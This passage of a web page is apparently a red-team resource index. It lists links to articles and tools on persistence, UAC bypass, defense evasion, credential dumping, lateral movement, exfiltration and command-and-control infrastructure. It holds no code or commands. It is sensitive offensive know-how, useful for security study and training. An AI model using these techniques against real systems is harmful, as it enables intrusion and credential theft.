rel="noopener">Gscript Dropper</a></li></ul><h2 id="↑-Persistence"><a href="#↑-Persistence" class="headerlink" title="↑ Persistence"></a><a href="#table-of-contents">↑</a> Persistence</h2><ul><li><a href="https://rastamouse.me/2018/03/a-view-of-persistence/" target="_blank" rel="noopener">A View of Persistence</a></li><li><a href="https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353" target="_blank" rel="noopener">hiding registry keys with psreflect</a></li><li><a href="https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using RunOnceEx – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/" target="_blank" rel="noopener">Persistence using GlobalFlags in Image File Execution Options – Hidden from Autoruns.exe</a></li><li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it – part 2</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/20/WMI-Persistence.html" target="_blank" rel="noopener">WMI Persistence with Cobalt Strike</a></li><li><a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence</a></li><li><a href="https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/" target="_blank" rel="noopener">Leveraging INF-SCT Fetch &amp; Execute Techniques For Bypass, Evasion, &amp; Persistence (Part 2)</a></li><li><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">Vshadow: Abusing the Volume Shadow Service for Evasion, Persistence, and Active Directory Database Extraction</a></li></ul><h2 id="↑-Privilege-Escalation"><a href="#↑-Privilege-Escalation" class="headerlink" title="↑ Privilege Escalation"></a><a href="#table-of-contents">↑</a> Privilege Escalation</h2><h3 id="User-Account-Control-Bypass"><a href="#User-Account-Control-Bypass" class="headerlink" title="User Account Control Bypass"></a>User Account Control Bypass</h3><ul><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" target="_blank" rel="noopener">First entry: Welcome and fileless UAC bypass,</a></li><li><a href="https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html" target="_blank" rel="noopener">Exploiting Environment Variables in Scheduled Tasks for UAC Bypass,</a></li><li>Reading Your Way Around UAC in 3 parts:<br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="noopener">Part 1.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html" target="_blank" rel="noopener">Part 2.</a><br> <a href="https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html" target="_blank" rel="noopener">Part 3.</a></li><li><a href="https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/" target="_blank" rel="noopener">Bypassing UAC using App Paths,</a></li><li><a href="https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/" target="_blank" rel="noopener">“Fileless” UAC Bypass using sdclt.exe,</a></li><li><a href="https://habrahabr.ru/company/pm/blog/328008/" target="_blank" rel="noopener">UAC Bypass or story about three escalations,</a></li><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" target="_blank" rel="noopener">“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking,</a></li><li><a href="https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/" target="_blank" rel="noopener">Bypassing UAC on Windows 10 using Disk Cleanup,</a></li><li><a href="http://www.freebuf.com/articles/system/116611.html" target="_blank" rel="noopener">Using IARPUninstallStringLauncher COM interface to bypass UAC,</a></li><li><a href="https://posts.specterops.io/fileless-uac-bypass-using-sdclt-exe-3e9f9ad4e2b3" target="_blank" rel="noopener">Fileless UAC Bypass using sdclt</a></li><li><a href="https://www.mdsec.co.uk/2016/12/cna-eventvwr-uac-bypass/" target="_blank" rel="noopener">Eventvwr File-less UAC Bypass CNA</a></li><li><a href="http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" target="_blank" rel="noopener">Windows 7 UAC whitelist</a></li></ul><h3 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h3><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md" target="_blank" rel="noopener">Windows Privilege Escalation Checklist</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/03/17/COM-Moniker-Privesc.html" target="_blank" rel="noopener">From Patch Tuesday to DA</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/08/cobalt-strike-3-6-a-path-for-privilege-escalation/" target="_blank" rel="noopener">A Path for Privilege Escalation</a></li></ul><h2 id="↑-Defense-Evasion"><a href="#↑-Defense-Evasion" class="headerlink" title="↑ Defense Evasion"></a><a href="#table-of-contents">↑</a> Defense Evasion</h2><ul><li><a href="https://github.com/tyranid/DeviceGuardBypasses" target="_blank" rel="noopener">Window 10 Device Guard Bypass</a></li><li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">App Locker ByPass List</a></li><li><a href="https://github.com/vysec/Windows-SignedBinary" target="_blank" rel="noopener">Window Signed Binary</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypass-application-whitelisting-script.html" target="_blank" rel="noopener">Bypass Application Whitelisting Script Protections - Regsvr32.exe &amp; COM Scriptlets (.sct files)</a></li><li><a href="http://subt0x10.blogspot.sg/2017/04/bypassing-application-whitelisting.html" target="_blank" rel="noopener">Bypassing Application Whitelisting using MSBuild.exe - Device Guard Example and Mitigations</a></li><li><a href="https://bneg.io/2017/07/26/empire-without-powershell-exe/" target="_blank" rel="noopener">Empire without powershell</a></li><li><a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/" target="_blank" rel="noopener">Powershell without Powershell to bypass app whitelist</a></li><li><a href="https://github.com/secretsquirrel/SigThief" target="_blank" rel="noopener">MS Signed mimikatz in just 3 steps</a></li><li><a href="https://riscybusiness.wordpress.com/2017/10/07/hiding-your-process-from-sysinternals/" target="_blank" rel="noopener">Hiding your process from sysinternals</a></li><li><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec" target="_blank" rel="noopener">code signing certificate cloning attacks and defenses</a></li><li><a href="https://0x00sec.org/t/userland-api-monitoring-and-code-injection-detection/5565" target="_blank" rel="noopener">userland api monitoring and code injection detection</a></li><li><a href="https://blog.cobaltstrike.com/2018/02/08/in-memory-evasion/" target="_blank" rel="noopener">In memory evasion</a></li><li><a href="https://posts.specterops.io/bypassing-amsi-via-com-server-hijacking-b8a3354d1aff" target="_blank" rel="noopener">Bypassing AMSI via COM Server Hijacking</a></li><li><a href="https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/" target="_blank" rel="noopener">process doppelganging</a></li><li><a href="http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html" target="_blank" rel="noopener">Week of Evading Microsoft ATA - Announcement and Day 1 to Day 5</a></li><li><a href="https://cybersyndicates.com/2015/06/veil-evasion-aes-encrypted-httpkey-request-module/" target="_blank" rel="noopener">VEIL-EVASION AES ENCRYPTED HTTPKEY REQUEST: SAND-BOX EVASION</a></li><li><a href="https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/" target="_blank" rel="noopener">Putting data in Alternate data streams and how to execute it</a></li><li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/" target="_blank" rel="noopener">AppLocker – Case study – How insecure is it really? – Part 1</a></li><li><a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/" target="_blank" rel="noopener">AppLocker – Case study – How insecure is it really? – Part 2</a></li><li><a href="https://oddvar.moe/2017/12/13/harden-windows-with-applocker-based-on-case-study-part-1/" target="_blank" rel="noopener">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2017/12/21/harden-windows-with-applocker-based-on-case-study-part-2/" target="_blank" rel="noopener">Harden Windows with AppLocker – based on Case study part 2</a></li><li><a href="https://oddvar.moe/2018/01/03/office-365-safe-links-bypass/" target="_blank" rel="noopener">Office 365 Safe links bypass</a></li><li><a href="https://oddvar.moe/2018/03/15/windows-defender-attack-surface-reduction-rules-bypass/" target="_blank" rel="noopener">Windows Defender Attack Surface Reduction Rules bypass</a></li><li><a href="https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/" target="_blank" rel="noopener">Bypassing Device guard UMCI using CHM – CVE-2017-8625</a></li><li><a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/" target="_blank" rel="noopener">Bypassing Application Whitelisting with BGInfo</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/01/10/cloning-captive-portals.html" target="_blank" rel="noopener">Cloning and Hosting Evil Captive Portals using a Wifi PineApple</a></li><li><a href="https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/" target="_blank" rel="noopener">https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/</a></li><li><a href="https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/" target="_blank" rel="noopener">Executing Commands and Bypassing AppLocker with PowerShell Diagnostic Scripts</a></li><li><a href="https://posts.specterops.io/mavinject-exe-functionality-deconstructed-c29ab2cf5c0e" target="_blank" rel="noopener">mavinject.exe Functionality Deconstructed</a></li></ul><h2 id="↑-Credential-Access"><a href="#↑-Credential-Access" class="headerlink" title="↑ Credential Access"></a><a href="#table-of-contents">↑</a> Credential Access</h2><ul><li><a href="https://blog.cobaltstrike.com/2015/12/16/windows-access-tokens-and-alternate-credentials/" target="_blank" rel="noopener">Windows Access Tokens and Alternate credentials</a></li><li><a href="https://sensepost.com/blog/2016/bringing-the-hashes-home-with-regeorg-empire/" target="_blank" rel="noopener">Bringing the hashes home with reGeorg &amp; Empire</a></li><li><a href="https://sensepost.com/blog/2016/intercepting-passwords-with-empire-and-winning/" target="_blank" rel="noopener">Intercepting passwords with Empire and winning</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-1/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 1</a></li><li><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="noopener">Local Administrator Password Solution (LAPS) Part 2</a></li><li><a href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/" target="_blank" rel="noopener">USING A SCF FILE TO GATHER HASHES</a></li><li><a href="https://www.harmj0y.net/blog/" target="_blank" rel="noopener">Remote Hash Extraction On Demand Via Host Security Descriptor Modification</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/offensive-encrypted-data-storage/" target="_blank" rel="noopener">Offensive Encrypted Data Storage</a></li><li><a href="https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html" target="_blank" rel="noopener">Practical guide to NTLM Relaying</a></li><li><a href="https://adsecurity.org/?p=2053" target="_blank" rel="noopener">Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync</a></li><li><a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/" target="_blank" rel="noopener">Dumping Domain Password Hashes</a></li></ul><h2 id="↑-Discovery"><a href="#↑-Discovery" class="headerlink" title="↑ Discovery"></a><a href="#table-of-contents">↑</a> Discovery</h2><ul><li><a href="https://www.owasp.org/images/4/4b/Red_Team_Operating_in_a_Modern_Environment.pdf" target="_blank" rel="noopener">Red Team Operating in a Modern Environment</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="https://wald0.com/?p=68" target="_blank" rel="noopener">Introducing BloodHound</a></li><li><a href="https://wald0.com/?p=179" target="_blank" rel="noopener">A Red Teamer’s Guide to GPOs and OUs</a></li><li><a href="https://wald0.com/?p=14" target="_blank" rel="noopener">Automated Derivative Administrator Search</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/" target="_blank" rel="noopener">A Pentester’s Guide to Group Scoping</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/local-group-enumeration/" target="_blank" rel="noopener">Local Group Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-1/" target="_blank" rel="noopener">The PowerView PowerUsage Series #1 - Mass User Profile Enumeration</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-2/" target="_blank" rel="noopener">The PowerView PowerUsage Series #2 – Mapping Computer Shortnames With the Global Catalog</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #3 – Enumerating GPO edit rights in a foreign domain</a></li><li><a href="http://www.harmj0y.net/blog/powershell/the-powerview-powerusage-series-3/" target="_blank" rel="noopener">The PowerView PowerUsage Series #4 – Finding cross-trust ACEs</a></li><li><a href="http://threat.tevora.com/aggressor-powerview/" target="_blank" rel="noopener">Aggressor PowerView</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://adsecurity.org/?p=3658" target="_blank" rel="noopener">Scanning for Active Directory Privileges &amp; Privileged Accounts</a></li><li><a href="https://adsecurity.org/?p=3164" target="_blank" rel="noopener">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</a></li><li><a href="https://bohops.com/2017/12/02/trust-direction-an-enabler-for-active-directory-enumeration-and-trust-exploitation/" target="_blank" rel="noopener">Trust Direction: An Enabler for Active Directory Enumeration and Trust Exploitation</a></li><li><a href="https://pentestlab.blog/2018/06/04/spn-discovery/" target="_blank" rel="noopener">SPN Discovery</a></li></ul><h2 id="↑-Lateral-Movement"><a href="#↑-Lateral-Movement" class="headerlink" title="↑ Lateral Movement"></a><a href="#table-of-contents">↑</a> Lateral Movement</h2><ul><li><a href="https://rastamouse.me/2017/05/a-citrix-story/" target="_blank" rel="noopener">A Citrx Story</a></li><li><a href="https://rastamouse.me/2017/08/jumping-network-segregation-with-rdp/" target="_blank" rel="noopener">Jumping Network Segregation with RDP</a></li><li><a href="http://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/" target="_blank" rel="noopener">Pass hash pass ticket no pain</a></li><li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">Abusing DNSAdmins privilege for escalation in Active Directory</a></li><li><a href="http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html" target="_blank" rel="noopener">Using SQL Server for attacking a Forest Trust</a></li><li><a href="https://www.youtube.com/watch?v=Pn7GWRXfgeI" target="_blank" rel="noopener">Extending BloodHound for Red Teamers</a></li><li><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/" target="_blank" rel="noopener">OPSEC Considerations for beacon commands</a></li><li><a href="https://blog.cobaltstrike.com/2016/12/14/my-first-go-with-bloodhound/" target="_blank" rel="noopener">My First Go with BloodHound</a></li><li><a href="http://www.exumbraops.com/blog/2016/6/1/kerberos-party-tricks-weaponizing-kerberos-protocol-flaws" target="_blank" rel="noopener">Kerberos Party Tricks: Weaponizing Kerberos Protocol Flaws</a></li><li><a href="https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/" target="_blank" rel="noopener">Lateral movement using excel application and dcom</a></li><li><a href="http://threat.tevora.com/lay-of-the-land-with-bloodhound/" target="_blank" rel="noopener">Lay of the Land with BloodHound</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/" target="_blank" rel="noopener">The Most Dangerous User Right You (Probably) Have Never Heard Of</a></li><li><a href="https://blog.cobaltstrike.com/2016/11/03/agentless-post-exploitation/" target="_blank" rel="noopener">Agentless Post Exploitation</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/" target="_blank" rel="noopener">A Guide to Attacking Domain Trusts</a>   </li><li><a href="https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/" target="_blank" rel="noopener">Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/" target="_blank" rel="noopener">Targeted Kerberoasting</a></li><li><a href="https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">Kerberoasting Without Mimikatz</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" target="_blank" rel="noopener">Abusing GPO Permissions</a></li><li><a href="https://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/" target="_blank" rel="noopener">Abusing Active Directory Permissions with PowerView</a></li><li><a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/" target="_blank" rel="noopener">Roasting AS-REPs</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 1</a></li><li><a href="https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html" target="_blank" rel="noopener">Getting the goods with CrackMapExec: Part 2</a></li><li><a href="https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction</a></li><li><a href="https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/" target="_blank" rel="noopener">Abusing Exported Functions and Exposed DCOM Interfaces for Pass-Thru Command Execution and Lateral Movement</a></li><li><a href="https://posts.specterops.io/a-guide-to-attacking-domain-trusts-971e52cb2944" target="_blank" rel="noopener">a guide to attacking domain trusts</a></li><li><a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/" target="_blank" rel="noopener">Outlook Home Page – Another Ruler Vector</a></li><li><a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/" target="_blank" rel="noopener">Outlook Forms and Shells</a></li><li><a href="https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/" target="_blank" rel="noopener">Abusing the COM Registry Structure: CLSID, LocalServer32, &amp; InprocServer32</a></li><li><a href="https://codewhitesec.blogspot.com/2018/07/lethalhta.html" target="_blank" rel="noopener">LethalHTA - A new lateral movement technique using DCOM and HTA</a></li><li><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" target="_blank" rel="noopener">Abusing DCOM For Yet Another Lateral Movement Technique</a></li></ul><h2 id="↑-Collection"><a href="#↑-Collection" class="headerlink" title="↑ Collection"></a><a href="#table-of-contents">↑</a> Collection</h2><ul><li><a href="https://oddvar.moe/2017/01/24/accessing-clipboard-from-the-lock-screen-in-windows-10/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 1</a></li><li><a href="https://oddvar.moe/2017/01/27/access-clipboard-from-lock-screen-in-windows-10-2/" target="_blank" rel="noopener">Accessing clipboard from the lock screen in Windows 10 Part 2</a></li></ul><h2 id="↑-Exfiltration"><a href="#↑-Exfiltration" class="headerlink" title="↑ Exfiltration"></a><a href="#table-of-contents">↑</a> Exfiltration</h2><ul><li><a href="https://blog.fosec.vn/dns-data-exfiltration-what-is-this-and-how-to-use-2f6c69998822" target="_blank" rel="noopener">DNS Data exfiltration — What is this and How to use?</a></li><li><a href="http://resources.infosecinstitute.com/dns-tunnelling/" target="_blank" rel="noopener">DNS Tunnelling</a></li><li><a href="https://securityonline.info/sg1-swiss-army-knife-for-data-encryption-exfiltration-covert-communication/?utm_source=ReviveOldPost&amp;utm_medium=social&amp;utm_campaign=ReviveOldPost" target="_blank" rel="noopener">sg1: swiss army knife for data encryption, exfiltration &amp; covert communication</a></li><li><a href="https://n0where.net/data-exfiltration-over-dns-request-covert-channel-dnsexfiltrator" target="_blank" rel="noopener">Data Exfiltration over DNS Request Covert Channel: DNSExfiltrator</a></li><li><a href="https://github.com/PaulSec/DET" target="_blank" rel="noopener">DET (extensible) Data Exfiltration Toolkit</a></li><li><a href="https://www.notsosecure.com/data-exfiltration-formula-injection/" target="_blank" rel="noopener">Data Exfiltration via Formula Injection Part1</a></li></ul><h2 id="↑-Command-and-Control"><a href="#↑-Command-and-Control" class="headerlink" title="↑ Command and Control"></a><a href="#table-of-contents">↑</a> Command and Control</h2><h3 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h3><ul><li><a href="https://www.xorrior.com/Empire-Domain-Fronting/" target="_blank" rel="noopener">Empre Domain Fronting</a></li><li><a href="https://www.optiv.com/blog/escape-and-evasion-egressing-restricted-networks" target="_blank" rel="noopener">Escape and Evasion Egressing Restricted Networks - Tom Steele and Chris Patten</a></li><li><a href="https://github.com/rvrsh3ll/FindFrontableDomains" target="_blank" rel="noopener">Finding Frontable Domain</a></li><li><a href="https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/" target="_blank" rel="noopener">TOR Fronting – Utilising Hidden Services for Privacy</a></li><li><a href="https://www.securityartwork.es/2017/01/31/simple-domain-fronting-poc-with-gae-c2-server/" target="_blank" rel="noopener">Simple domain fronting PoC with GAE C2 server</a></li><li><a href="https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/" target="_blank" rel="noopener">Domain Fronting Via Cloudfront Alternate Domains</a></li><li><a href="https://theobsidiantower.com/2017/07/24/d0a7cfceedc42bdf3a36f2926bd52863ef28befc.html" target="_blank" rel="noopener">Finding Domain frontable Azure domains - thoth / Fionnbharr (@a_profligate)</a></li><li><a href="https://groups.google.com/forum/#!topic/traffic-obf/7ygIXCPebwQ" target="_blank" rel="noopener">Google Groups: Blog post on finding 2000+ Azure domains using Censys</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://www.rvrsh3ll.net/blog/offensive/ssl-domain-fronting-101/" target="_blank" rel="noopener">SSL Domain Fronting 101</a></li><li><a href="https://www.peew.pw/blog/2018/2/22/how-i-identified-93k-domain-frontable-cloudfront-domains" target="_blank" rel="noopener">How I Identified 93k Domain-Frontable CloudFront Domains</a></li><li><a href="https://medium.com/@vysec.private/validated-cloudfront-ssl-domains-27895822cea3" target="_blank" rel="noopener">Validated CloudFront SSL Domains</a></li><li><a href="https://www.mindpointgroup.com/blog/pen-test/cloudfront-hijacking/" target="_blank" rel="noopener">CloudFront Hijacking</a></li><li><a href="https://github.com/MindPointGroup/cloudfrunt" target="_blank" rel="noopener">CloudFrunt GitHub Repo</a></li></ul><h3 id="Connection-Proxy"><a href="#Connection-Proxy" class="headerlink" title="Connection Proxy"></a>Connection Proxy</h3><ul><li><a href="http://www.rvrsh3ll.net/blog/offensive/redirecting-cobalt-strike-dns-beacons/" target="_blank" rel="noopener">Redirecting Cobalt Strike DNS Beacons</a></li><li><a href="https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup" target="_blank" rel="noopener">Apache2Mod Rewrite Setup</a></li><li><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></li><li><a href="https://blog.cobaltstrike.com/2017/02/06/high-reputation-redirectors-and-domain-fronting/" target="_blank" rel="noopener">High-reputation Redirectors and Domain Fronting</a></li><li><a href="https://blog.cobaltstrike.com/2014/01/14/cloud-based-redirectors-for-distributed-hacking/" target="_blank" rel="noopener">Cloud-based Redirectors for Distributed Hacking</a></li><li><a href="https://bluescreenofjeff.com/2016-04-12-combatting-incident-responders-with-apache-mod_rewrite/" target="_blank" rel="noopener">Combatting Incident Responders with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-04-05-operating-system-based-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Operating System Based Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-29-invalid-uri-redirection-with-apache-mod_rewrite/" target="_blank" rel="noopener">Invalid URI Redirection with Apache mod_rewrite</a></li><li><a href="https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/" target="_blank" rel="noopener">Strengthen Your Phishing with Apache mod_rewrite and Mobile User Redirection</a></li><li><a href="https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10" target="_blank" rel="noopener">mod_rewrite rule to evade vendor sandboxes</a></li><li><a href="https://bluescreenofjeff.com/2016-04-19-expire-phishing-links-with-apache-rewritemap/" target="_blank" rel="noopener">Expire Phishing Links with Apache RewriteMap</a></li><li><a href="https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9" target="_blank" rel="noopener">Serving random payloads with NGINX</a></li><li><a href="https://blog.inspired-sec.com/archive/2017/04/17/Mod-Rewrite-Automatic-Setup.html" target="_blank" rel="noopener">Mod_Rewrite Automatic Setup</a></li><li><a href="https://zachgrace.com/2018/02/20/cobalt_strike_redirectors.html" target="_blank" rel="noopener">Hybrid Cobalt Strike Redirectors</a></li><li><a href="https://cybersyndicates.com/2017/04/expand-your-horizon-red-team/" target="_blank" rel="noopener">Expand Your Horizon Red Team – Modern SAAS C2</a></li><li><a href="http://threat.tevora.com/automating-redirector-deployment-with-ansible/" target="_blank" rel="noopener">RTOps: Automating Redirector Deployment With Ansible</a></li></ul><h3 id="Web-Services"><a href="#Web-Services" class="headerlink" title="Web Services"></a>Web Services</h3><ul><li><a href="https://pentestlab.blog/2017/08/29/command-and-control-dropbox/" target="_blank" rel="noopener">C2 with Dropbox</a></li><li><a href="https://pentestlab.blog/2017/08/03/command-and-control-gmail/" target="_blank" rel="noopener">C2 with gmail</a></li><li><a href="https://pentestlab.blog/2017/09/26/command-and-control-twitter/" target="_blank" rel="noopener">C2 with twitter</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2/" target="_blank" rel="noopener">Office 365 for Cobalt Strike C2</a></li><li><a href="https://www.cyberark.com/threat-research-blog/red-team-insights-https-domain-fronting-google-hosts-using-cobalt-strike/" target="_blank" rel="noopener">Red Team Insights on HTTPS Domain Fronting Google Hosts Using Cobalt Strike</a></li><li><a href="http://securityblog.gr/4434/a-stealthy-python-based-windows-backdoor-that-uses-github-as-a-cc-server/" target="_blank" rel="noopener">A stealthy Python based Windows backdoor that uses Github as a C&amp;C server</a></li><li><a href="https://www.cobaltstrike.com/help-externalc2" target="_blank" rel="noopener">External C2 (Third-Party Command and Control)</a></li><li><a href="https://outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/" target="_blank" rel="noopener">Cobalt Strike over external C2 – beacon home in the most obscure ways</a></li><li><a href="https://github.com/ryhanson/ExternalC2/" target="_blank" rel="noopener">External C2 for Cobalt Strike</a></li><li><a href="http://www.insomniacsecurity.com/2018/01/11/externalc2.html" target="_blank" rel="noopener">External C2 framework for Cobalt Strike</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">External C2 framework - GitHub Repo</a></li><li><a href="https://github.com/Und3rf10w/external_c2_framework" target="_blank" rel="noopener">Hiding in the Cloud: Cobalt Strike Beacon C2 using Amazon APIs</a></li><li><a href="https://blog.xpnsec.com/exploring-cobalt-strikes-externalc2-framework/" target="_blank" rel="noopener">Exploring Cobalt Strike’s ExternalC2 framework</a></li></ul><h3 id="Application-Layer-Protocol"><a href="#Application-Layer-Protocol" class="headerlink" title="Application Layer Protocol"></a>Application Layer Protocol</h3><ul><li><a href="https://pentestlab.blog/2017/12/06/command-and-control-websocket/" target="_blank" rel="noopener">C2 WebSocket</a></li><li><a href="https://pentestlab.blog/2017/11/20/command-and-control-wmi/" target="_blank" rel="noopener">C2 WMI</a></li><li><a href="https://pentestlab.blog/2017/11/14/command-and-control-website/" target="_blank" rel="noopener">C2 Website</a></li><li><a href="https://pentestlab.blog/2018/01/02/command-and-control-images/" target="_blank" rel="noopener">C2 Image</a></li><li><a href="https://pentestlab.blog/2018/01/08/command-and-control-javascript/" target="_blank" rel="noopener">C2 Javascript</a></li><li><a href="https://pentestlab.blog/2018/01/03/command-and-control-web-interface/" target="_blank" rel="noopener">C2 WebInterface</a></li><li><a href="https://pentestlab.blog/2017/09/06/command-and-control-dns/" target="_blank" rel="noopener">C2 with DNS</a></li><li><a href="https://pentestlab.blog/2017/10/04/command-and-control-https/" target="_blank" rel="noopener">C2 with https</a></li><li><a href="https://pentestlab.blog/2017/09/12/command-and-control-webdav/" target="_blank" rel="noopener">C2 with webdav</a></li><li><a href="https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a" target="_blank" rel="noopener">Introducing Merlin — A cross-platform post-exploitation HTTP/2 Command &amp; Control Tool</a></li><li><a 